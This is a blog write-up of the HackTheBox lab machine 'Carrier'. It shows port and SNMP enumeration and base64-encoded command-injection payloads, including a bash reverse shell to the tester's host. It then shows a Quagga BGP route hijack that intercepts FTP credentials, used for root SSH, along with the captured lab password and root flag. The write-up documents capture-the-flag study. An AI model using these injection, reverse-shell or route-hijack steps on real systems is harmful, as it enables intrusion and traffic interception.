---
layout: post
title: Hackthebox Carrier Writeup
categories: HackTheBox
---

<img src="/public/images/2019-03-19/carrier_badge.png"><br>
## Explanation
<a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has bunch of vulnerable machines in its own VPN.
This is a write-up of machine "Carrier" on that website.

## Solution
### 1. Initial Enumeration
Port Scanning:
{% highlight shell %}
root@kali:~# nmap -p- 10.10.10.105 -sV -sC
Starting Nmap 7.70 ( https://nmap.org ) at 2018-09-23 09:22 EEST
Nmap scan report for 10.10.10.105
Host is up (0.037s latency).
Not shown: 65532 closed ports
PORT   STATE    SERVICE VERSION
21/tcp filtered ftp
22/tcp open     ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 15:a4:28:77:ee:13:07:06:34:09:86:fd:6f:cc:4c:e2 (RSA)
|   256 37:be:de:07:0f:10:bb:2b:b5:85:f7:9d:92:5e:83:25 (ECDSA)
|_  256 89:5a:ee:1c:22:02:d2:13:40:f2:45:2e:70:45:b0:c4 (ED25519)
80/tcp open     http    Apache httpd 2.4.18 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.14 seconds
{% endhighlight %}

Gobuster HTTP:
{% highlight shell %}
root@kali:~# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s '200,204,301,302,403' -u http://10.10.10.105/ -x .php

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.105/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,403
[+] Extensions   : php
[+] Timeout      : 10s
=====================================================
2018/09/23 09:56:07 Starting gobuster
=====================================================
/index.php (Status: 200)
/img (Status: 301)
/tools (Status: 301)
/doc (Status: 301)
/css (Status: 301)
/js (Status: 301)
/tickets.php (Status: 302)
/fonts (Status: 301)
/dashboard.php (Status: 302)
/debug (Status: 301)
/diag.php (Status: 302)
/server-status (Status: 403)
=====================================================
2018/09/23 10:27:10 Finished
=====================================================
{% endhighlight %}

UDP Scanning:
{% highlight shell %}
root@kali:~# nmap -sU 10.10.10.105 --top-ports 1000 -sV -sC
Starting Nmap 7.70 ( https://nmap.org ) at 2018-09-23 18:55 EEST
Nmap scan report for 10.10.10.105
Host is up (0.037s latency).
Not shown: 998 closed ports
PORT    STATE         SERVICE VERSION
67/udp  open|filtered dhcps
161/udp open          snmp    SNMPv1 server; pysnmp SNMPv3 server (public)
| snmp-info: 
|   enterprise: pysnmp
|   engineIDFormat: octets
|   engineIDData: 77656201ec7908
|   snmpEngineBoots: 2
|_  snmpEngineTime: 3h09m02s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1185.70 seconds
{% endhighlight %}

SNMP enumeration:
{% highlight shell %}
root@kali:~# snmpwalk -c public -v1 10.10.10.105
iso.3.6.1.2.1.47.1.1.1.1.11 = STRING: "SN#NET_45JDX23"
{% endhighlight %}

### 2.Getting User
What we can find on port 80 is login console of Lyghtspeed with some Error.
![placeholder](https://inar1.github.io/public/images/2019-03-19/2019-03-19-20-09-30.png)

By looking at "/doc/error_codef.pdf", we can figure out what these error code means and there is an interesting line.
![placeholder](https://inar1.github.io/public/images/2019-03-19/2019-03-19-20-11-45.png)

At the same time, we can find interesting information at "/doc/diagram_for_tac.png".<br>
We will use this information later.
![placeholder](https://inar1.github.io/public/images/2019-03-19/diagram_for_tac.png)

We can guess like "SN" stands for "serial number".<br>
If we try some petterns, we can find this credential for Lyghtspeed
{% highlight shell %}
admin:NET_45JDX23
{% endhighlight %}

After logged in, we can find an interesting page /diag.php.
![placeholder](https://inar1.github.io/public/images/2019-03-19/2019-03-19-20-13-46.png)

Sounds like if we click "verify status" button, we have a result of linux command.<br>
The value which we post is base64 encoded.
{% highlight html %}i
<input type="hidden" id="check" name="check" value="cXVhZ2dh">
<div class="form-group">
    <button type="submit" class="btn btn-primary">
{% endhighlight %}

Decoded value of "cXVhZ2dh" is "quagga" and This can be RCE vulnerability.<br>
By sending arbitrary code, we can achieve user.txt.
{% highlight shell %}
check=aHR0cDtpZDtjYXQgL3Jvb3QvdXNlci50eHQgIyA=
# http;id;cat /root/user.txt # 
{% endhighlight %}
![placeholder](https://inar1.github.io/public/images/2019-03-19/2019-03-19-13-16-40.png)

### Getting Root
By taking advantage of this RCE, we can easily achieve reverse shell.
{% highlight shell %}
check=aHR0cDtpZDtiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjIzLzQ0MyAwPiYxICMg
# http;id;bash -i >& /dev/tcp/10.10.14.23/443 0>&1 # 
{% endhighlight%}

{% highlight shell %}
root@kali:~# nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.10.105] 51590
bash: cannot set terminal process group (2281): Inappropriate ioctl for device
bash: no job control in this shell
root@r1:~# 
{% endhighlight %}

Sounds like we got a root shell. However, we can not find root.txt anywhere.<br>
This is because we're not on 10.10.10.105
{% highlight shell %}
root@r1:~# ifconfig
ifconfig
eth0      Link encap:Ethernet  HWaddr 00:16:3e:d9:04:ea  
          inet addr:10.99.64.2  Bcast:10.99.64.255  Mask:255.255.255.0
          inet6 addr: fe80::216:3eff:fed9:4ea/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:356 errors:0 dropped:0 overruns:0 frame:0
          TX packets:191 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:42612 (42.6 KB)  TX bytes:34096 (34.0 KB)

eth1      Link encap:Ethernet  HWaddr 00:16:3e:8a:f2:4f  
          inet addr:10.78.10.1  Bcast:10.78.10.255  Mask:255.255.255.0
          inet6 addr: fe80::216:3eff:fe8a:f24f/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:7495 errors:0 dropped:0 overruns:0 frame:0
          TX packets:7957 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:506169 (506.1 KB)  TX bytes:560602 (560.6 KB)

eth2      Link encap:Ethernet  HWaddr 00:16:3e:20:98:df  
          inet addr:10.78.11.1  Bcast:10.78.11.255  Mask:255.255.255.0
          inet6 addr: fe80::216:3eff:fe20:98df/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:8022 errors:0 dropped:0 overruns:0 frame:0
          TX packets:7594 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:537793 (537.7 KB)  TX bytes:536761 (536.7 KB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:368 errors:0 dropped:0 overruns:0 frame:0
          TX packets:368 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:29952 (29.9 KB)  TX bytes:29952 (29.9 KB)
{% endhighlight %}

On the ticket page, we can find some info about this network.
![placeholder](https://inar1.github.io/public/images/2019-03-19/2019-03-19-20-16-37.png)

We already know that <a href="https://www.nongnu.org/quagga/">Quagga</a> is running on this server.<br>
By enumeration, we can find additional servers which is realated to this server.<br>
At the same time, we can assume this server is working on BGP and BGP hijacking is the possible solution.
{% highlight shell %}
root@r1:/etc/quagga# cat bgpd.conf
cat bgpd.conf
!
! Zebra configuration saved from vty
!   2018/07/02 02:14:27
!
route-map to-as200 permit 10
route-map to-as300 permit 10
!
router bgp 100
 bgp router-id 10.255.255.1
 network 10.101.8.0/21
 network 10.101.16.0/21
 redistribute connected
 neighbor 10.78.10.2 remote-as 200
 neighbor 10.78.11.2 remote-as 300
 neighbor 10.78.10.2 route-map to-as200 out
 neighbor 10.78.11.2 route-map to-as300 out
!
line vty
{% endhighlight %}

Showing BGP configuration:
{% highlight shell %}
r1# show ip bgp
show ip bgp
BGP table version is 0, local router ID is 10.255.255.1
Status codes: s suppressed, d damped, h history, * valid, > best, = multipath,
              i internal, r RIB-failure, S Stale, R Removed
Origin codes: i - IGP, e - EGP, ? - incomplete

   Network          Next Hop            Metric LocPrf Weight Path
*> 10.78.10.0/24    0.0.0.0                  0         32768 ?
*> 10.78.11.0/24    0.0.0.0                  0         32768 ?
*> 10.99.64.0/24    0.0.0.0                  0         32768 ?
*  10.100.10.0/24   10.78.11.2                             0 300 200 i
*>                  10.78.10.2               0             0 200 i
*  10.100.11.0/24   10.78.11.2                             0 300 200 i
*>                  10.78.10.2               0             0 200 i
*  10.100.12.0/24   10.78.11.2                             0 300 200 i
*>                  10.78.10.2               0             0 200 i
*  10.100.13.0/24   10.78.11.2                             0 300 200 i
*>                  10.78.10.2               0             0 200 i
*  10.100.14.0/24   10.78.11.2                             0 300 200 i
*>                  10.78.10.2               0             0 200 i
*  10.100.15.0/24   10.78.11.2                             0 300 200 i
*>                  10.78.10.2               0             0 200 i
*  10.100.16.0/24   10.78.11.2                             0 300 200 i
*>                  10.78.10.2               0             0 200 i
*  10.100.17.0/24   10.78.11.2                             0 300 200 i
*>                  10.78.10.2               0             0 200 i
*  10.100.18.0/24   10.78.11.2                             0 300 200 i
*>                  10.78.10.2               0             0 200 i
*  10.100.19.0/24   10.78.11.2                             0 300 200 i
*>                  10.78.10.2               0             0 200 i
*  10.100.20.0/24   10.78.11.2                             0 300 200 i
*>                  10.78.10.2               0             0 200 i
*> 10.101.8.0/21    0.0.0.0                  0         32768 i
*> 10.101.16.0/21   0.0.0.0                  0         32768 i
*> 10.120.10.0/24   10.78.11.2               0             0 300 i
*                   10.78.10.2                             0 200 300 i
*> 10.120.11.0/24   10.78.11.2               0             0 300 i
*                   10.78.10.2                             0 200 300 i
*> 10.120.12.0/24   10.78.11.2               0             0 300 i
*                   10.78.10.2                             0 200 300 i
*> 10.120.13.0/24   10.78.11.2               0             0 300 i
*                   10.78.10.2                             0 200 300 i
*> 10.120.14.0/24   10.78.11.2               0             0 300 i
*                   10.78.10.2                             0 200 300 i
*> 10.120.15.0/24   10.78.11.2               0             0 300 i
*                   10.78.10.2                             0 200 300 i
*> 10.120.16.0/24   10.78.11.2               0             0 300 i
*                   10.78.10.2                             0 200 300 i
*> 10.120.17.0/24   10.78.11.2               0             0 300 i
*                   10.78.10.2                             0 200 300 i
*> 10.120.18.0/24   10.78.11.2               0             0 300 i
*                   10.78.10.2                             0 200 300 i
*> 10.120.19.0/24   10.78.11.2               0             0 300 i
*                   10.78.10.2                             0 200 300 i
*> 10.120.20.0/24   10.78.11.2               0             0 300 i
*                   10.78.10.2                             0 200 300 i

Total number of prefixes 27
{% endhighlight %}

Connections to the ftp server "10.120.15.10" are transmitted with eth2(10.78.11.2)<br>
Then, try to capture the ftp network traffic.<br>
BGP configuration:
{% highlight shell %}
root@r1:~# vtysh
vtysh

Hello, this is Quagga (version 0.99.24.1).
Copyright 1996-2005 Kunihiro Ishiguro, et al.

r1# conf t
conf t
r1(config)# router gbp 100
router gbp 100
% Unknown command.
r1(config)# router bgp 100
router bgp 100
r1(config-router)# network 10.120.15.0/25
network 10.120.15.0/25
r1(config-router)# end
end
r1# exit
{% endhighlight %}

Then, configure eth2 as ftp server address.
{% highlight shell %}
root@r1:~# ifconfig eth2 10.120.15.10 netmask 255.255.255.0 up
{% endhighlight %}

Capture the traffic with netcat
{% highlight shell %}
root@r1:~# nc -nlvp 21
nc -nlvp 21
Listening on [0.0.0.0] (family 0, port 21)
Connection from [10.78.10.2] port 21 [tcp/*] accepted (family 2, sport 52504)

USER root
331 Please specify the password.
PASS BGPtelc0rout1ng
{% endhighlight %}

We can not use this password for ftp.<br>
However. we can take advantage of this to login to "10.10.10.105" with ssh.
{% highlight shell %}
root@kali:~# ssh root@10.10.10.105
The authenticity of host '10.10.10.105 (10.10.10.105)' can't be established.
ECDSA key fingerprint is SHA256:ocbg7qpaEpjQc5WGCnavYd2bgyXg7S8if8UaXgT1ztE.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.10.105' (ECDSA) to the list of known hosts.
root@10.10.10.105's password: 
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-24-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Mar 19 17:48:44 UTC 2019

  System load:  0.08               Users logged in:       0
  Usage of /:   40.8% of 19.56GB   IP address for ens33:  10.10.10.105
  Memory usage: 32%                IP address for lxdbr0: 10.99.64.1
  Swap usage:   0%                 IP address for lxdbr1: 10.120.15.10
  Processes:    211


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

4 packages can be updated.
0 updates are security updates.


Last login: Wed Sep  5 14:32:15 2018
root@carrier:~# ls
root.txt  secretdata.txt
root@carrier:~# cat root.txt 
2832e552061532250ac2a21478fd4866
{% endhighlight %}
